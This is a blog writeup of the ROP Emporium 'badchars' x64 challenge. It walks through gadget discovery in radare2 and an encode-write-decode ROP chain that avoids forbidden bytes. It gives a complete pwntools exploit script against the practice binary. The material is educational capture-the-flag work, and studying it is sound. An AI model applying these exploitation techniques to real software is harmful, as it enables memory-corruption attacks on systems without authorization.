---
layout: post
title:  "ROP Emporium badchars Writeup (x64)"
date:   2024-06-05 00:00:00 -0400
categories: rop-emporium challenge-5
tags: rop-emporium badchars x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[fifth challenge](https://ropemporium.com/challenge/badchars.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

According to the
[challenge page](https://ropemporium.com/challenge/badchars.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves. In addition to this, there will be
forbidden characters we're not allowed to use anywhere
in our payload!

> This is what a hint will look like!
{: .prompt-tip }

## Exploit Crafting
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

### Writing to Memory
> Check out `usefulFunction`'s assembly
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. We will need to write `flag.txt` to
memory so let's check the `usefulGadgets` section
in `usefulFunction`
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful gadgets](/images/badchars/x64-useful-gadgets.png)

There are a few gadgets here! Most of them are potential
routes to decode our payload, but for now we'll focus on
the last one.
The `mov` instruction will set the value from
`r12` (8 byte qword) into the dereferenced address 
set in `r13`. This is what we'll use to write to memory
and its address is `0x00400634`

#### Setting Arguments
> Find a gadget to control `r12` and `r13`
{: .prompt-tip }
Now we need to find a gadget which can control `r12` and
`r13` to control what to write and where to write it. We
can use the `/R` command to search for gadgets
```
/R pop r12
```

![mov args gadget](/images/badchars/x64-mov-args-gadget.png)

This is the only gadget where we can directly control `r12`
and `r13`. Its address is `0x0040069c`

Up until now we've been able to find gadgets
that do exactly what we need, but now we have to deal
deal with extra instructions. Luckily, these instructions
can be ignored by adding junk to `pop` onto the stack until
the `ret` instruction is reached.

#### Writing Location
> Find a writable program segment
{: .prompt-tip }
Now that we can control where to write and what to write,
where and what should we write? We want to open `flag.txt`
so we'll set that into `r12`. But we need to find a
suitable location to write to. We can view writable
sections with the command `iS`

![writable sections](/images/badchars/x64-writable-sections.png)

We need to find a section with the `w` permission and a
size of at least 8 bytes (0x08). Let's use the
`.bss` section which has the address `0x00601038`
> If you try to write to the .data section, one
> of the generated write addresses will contain
> an invalid character
{: .prompt-info }


Here is some python code to write to an address
```python
#!/bin/python3
from pwn import *

write_addr = 0x00601038     # bss addr
mov_addr = 0x00400634       # mov qword [r13], r12
pop_regs = 0x0040069c       # pop r12-r15
junk = 0xdeadbeefdeadbeef

# write string s to address addr
# return ropchain in bytes
def write_str(addr, s):
    payload = b''
    r14 = p64(junk)
    r15 = p64(junk)

    # write every 8 bytes of a string
    for i in range(0, len(s), 8):

        # prevent slice out of bounds
        j = i+8
        if j > len(s):
            j = len(s)

        # 8 bytes to write
        r12 = p64(int.from_bytes(s[i:j], 'little'))
        # address to write to
        r13 = p64(addr + i)

        # fill registers
        payload += p64(pop_regs) + r12 + r13 + r14 + r15

        # write bytes
        payload += p64(mov_addr)
    return payload
```

### print_file()
> Find the `print_file` address and a gadget which
> sets the `rdi` register
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/badchars/x64-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x00400510`

Now we need to set the first argument to this function.
According to the
[x64 calling convention](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"},
the first argument of a function is passed through the `rdi`
register. Let's find a gadget to control it

```
/R pop rdi
```

![rdi-addr](/images/badchars/x64-rdi-addr.png)

Perfect! Our gadget address is `0x004006a3`

### Bad Chars
All of our prep work is done, so now we can
deal with the main part of this challenge.
The challenge binary will tell us which characters
are forbidden so let's get a list

![bad chars](/images/badchars/x64-bad-chars.png)

We're not allowed to have any of these characters in
our payload or else something like this happens

![no encoding](/images/badchars/x64-no-encoding.png)

The invalid characters get replaced with `0xeb`. This
isn't limited to arguments, it will affect every address 
in our payload. To
get past this we can encode the `flag.txt` string,
write the encoded string to memory, decode the
written string, then call `print_file`

Let's take a look at the `usefulGadgets` section in
`usefulFunction` again

![useful gadgets](/images/badchars/x64-useful-gadgets.png)

We have three options to decode our string in memory,
`xor`, `add`, and `sub`. All of these instructions have
the capability to decode our ciphertext, but we'll
use the `sub` instruction which has
the address `0x00400630`

First let's write a function to encode our string.
We're going to use a `sub` gadget to decode the
cipher text so we'll need to add values to encode
it. We'll add 2 to every character since adding 1
would turn the `f` in `flag.txt` into a `g` which
is a forbidden character. The encoding function
looks like this

```python
def encode_str(s):
    blist = bytearray(s)
    for i in range(0, len(blist)):
        blist[i] += 2
    return blist
```

Now let's write a function to decode our cipher text.
The value we want to add will be placed into `r14` (2)
and `r15` will have the address of the byte we want to 
decode. We can reuse the `pop` gadget we found previously 
and skip the instructions which set `r12` and `r13`.
Here's the decoding function

```python
#!/bin/python3
from pwn import *

# useful addresses
sub_addr = 0x00400630       # sub byte [r15], r14b 
pop_r14_r15 = 0x004006a0

def decode_str(addr, s):
    payload = b''
    for i in range(0, len(s)):
        r14 = p64(0x2)
        r15 = p64(addr + i)
        payload += p64(pop_r14_r15) + r14 + r15
        payload += p64(sub_addr)
    return payload
```

In addition to this, we can add a check to determine
if an invalid character is present in our payload just
to be safe

```python
# check if payload is valid
invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]
for i in range(len(payload)):
    if payload[i] in invalid_bytes:
        print('invalid char', '"'+chr(payload[i])+'"', 'at index', i)
        exit()
```

## Exploit
We finally have everything we need to build the exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
write_addr = 0x00601038     # bss addr
mov_addr = 0x00400634       # mov qword [r13], r12
sub_addr = 0x00400630       # sub byte [r15], r14b 
pop_regs = 0x0040069c       # pop r12-r15
pop_r14_r15 = 0x004006a0
pop_r15 = 0x004006a2
pop_rdi = 0x004006a3
print_file_addr = 0x00400510
junk = 0xdeadbeefdeadbeef

invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]

# write string s to address addr
# return ropchain in bytes
def write_str(addr, s):
    payload = b''
    r14 = p64(junk)
    r15 = p64(junk)

    # write every 8 bytes of a string
    for i in range(0, len(s), 8):

        # prevent slice out of bounds
        j = i+8
        if j > len(s):
            j = len(s)

        # 8 bytes to write
        r12 = p64(int.from_bytes(s[i:j], 'little'))
        # address to write to
        r13 = p64(addr + i)

        # fill registers
        payload += p64(pop_regs) + r12 + r13 + r14 + r15

        # write bytes
        payload += p64(mov_addr)
    return payload

# subtract 2 from every character
def decode_str(addr, s):
    payload = b''
    for i in range(0, len(s)):
        r14 = p64(0x2)
        r15 = p64(addr + i)
        payload += p64(pop_r14_r15) + r14 + r15
        payload += p64(sub_addr)
    return payload

# add 2 to every character
def encode_str(s):
    blist = bytearray(s)
    for i in range(0, len(blist)):
        blist[i] += 2
    return blist

# build payload
payload = b'A' * 40
fname = encode_str(b'flag.txt')
payload += write_str(write_addr, fname)
payload += decode_str(write_addr, fname)
# call print_file
payload += p64(pop_rdi)
payload += p64(write_addr)
payload += p64(print_file_addr)

# check if payload is valid
for i in range(len(payload)):
    if payload[i] in invalid_bytes:
        print('invalid char', '"'+chr(payload[i])+'"', 'at index', i)
        exit()

# send payload + receive flag
io = process('./badchars')
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![flag](/images/badchars/x64-flag.png)

### Extra Credit
If you've made it this far in the series then you're
probably comfortable chaining gadgets together. From
here on out we'll be working with various constraints
such as sparse gadgets or a limited stack size. Depending
on the conditions, the size of our payload may matter!

The first solution is simpler to code, but we could
make the size of our payload smaller. The largest 
amount of space could be saved by not encoding every
byte of the string, but only encoding the forbidden
characters! A smaller optimization (24 bytes) could
be applied to our decoding function. Since `r14` is
set to the same value during decoding, we only need
to set it once during the whole decoding process!

Here are the updated functions which produces a payload 
that is more space efficient

```python
#!/bin/python3
from pwn import *

# subtract 1 at proper indices
sub_indices = []
def decode_str(addr, s):
    payload = b''
    is_r14_set = False
    for i in range(0, len(s)):
        if i not in sub_indices:
            continue
        r15 = p64(addr + i)
        if not is_r14_set:
            r14 = p64(0x1)
            payload += p64(pop_r14_r15) + r14 + r15
            is_r14_set = True
        else:
            payload += p64(pop_r15) + r15
        payload += p64(sub_addr)
    return payload

# add 1 to forbidden chars
invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]
def encode_str(s):
    blist = bytearray(s)
    for i in range(0, len(blist)):
        if blist[i] in invalid_bytes:
            blist[i] += 1
            sub_indices.append(i)
    return blist
```

![smaller payload](/images/badchars/x64-smaller-payload.png)

We made the payload 152 bytes smaller!

## Conclusion
In this challenge we learned how to bypass forbidden
characters in our ROP chain by decoding an encoded string
in memory. Next we'll learn how to write to memory with
more complicated gadgets.

[Previous Challenge (write4)]({% post_url 2024-06-03-rop-emporium-write4-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[Next Challenge (fluff)]({% post_url 2024-06-06-rop-emporium-fluff-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[badchars x86]({% post_url 2024-06-05-rop-emporium-badchars-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
